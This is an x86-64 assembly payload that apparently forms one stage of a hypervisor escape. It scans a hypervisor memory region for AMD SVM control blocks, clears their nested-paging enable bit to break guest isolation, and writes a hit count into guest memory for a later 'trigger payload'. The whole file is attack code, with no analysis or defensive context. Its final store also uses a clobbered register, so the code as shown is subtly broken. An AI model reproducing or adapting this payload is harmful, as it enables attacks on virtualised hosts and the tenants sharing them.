# ap_launch.S — root-0 AP payload: signature-scan the HV carve-out for the 16 VMCBs,
# clear NP_ENABLE (write 0x8 to NESTED_CTRL@+0x90), and emit a strike count marker.
#
# Runs at 0x3ffff000 under NPT root 0 (host view) after HCALL 0x0f launches it, with
# CR3=0x68000 (the firmware's root-0 identity map, executable 0x0..0x40000000).
# Position-independent, no libc, no relocations.
#
# Scan 0x60000000..0x70000000 (the HV SME carve-out) at 4 KiB stride for:
#   [P+0x90] == 9          (NESTED_CTRL: NP_ENABLE | GMET)
#   [P+0xb8] == 1          (Control2)
#   [P+0xb0] != 0, 4K-aligned  (NESTED_CR3)
# On match: store 0x8 to [P+0x90] (clear NP_ENABLE, keep GMET), count++.
#
# Marker: strike count written to physical 0x40000000 (guest RAM, plaintext), read
# back by the trigger payload via DMAP+0x40000000.

    .intel_syntax noprefix
    .code64
    .section .text
    .global _ap_launch_start
    .global _ap_launch_end

_ap_launch_start:
    mov     r12, 0x60000000        # scan start (carve-out base)
    mov     r13, 0x70000000        # scan end
    xor     r14d, r14d             # strike count = 0

scan:
    cmp     r12, r13
    jae     done

    cmp     dword ptr [r12 + 0x90], 9      # NESTED_CTRL == 9 ?
    jne     next
    cmp     dword ptr [r12 + 0xb8], 1      # Control2 == 1 ?
    jne     next
    mov     rax, [r12 + 0xb0]              # NESTED_CR3: nonzero + 4K-aligned
    test    rax, rax
    jz      next
    test    rax, 0xfff
    jnz     next

    mov     dword ptr [r12 + 0x90], 0x8    # strike: clear NP_ENABLE (keep GMET)
    inc     r14d

next:
    add     r12, 0x1000
    jmp     scan

done:
    mov     rax, 0x40000000        # marker page (guest RAM)
    mov     [rax], r14d            # emit strike count
    mov     eax, 0xdeadbeef
    mov     [rax + 8], eax         # emit magic (proves the AP ran)
1:  hlt
    jmp     1b

_ap_launch_end:
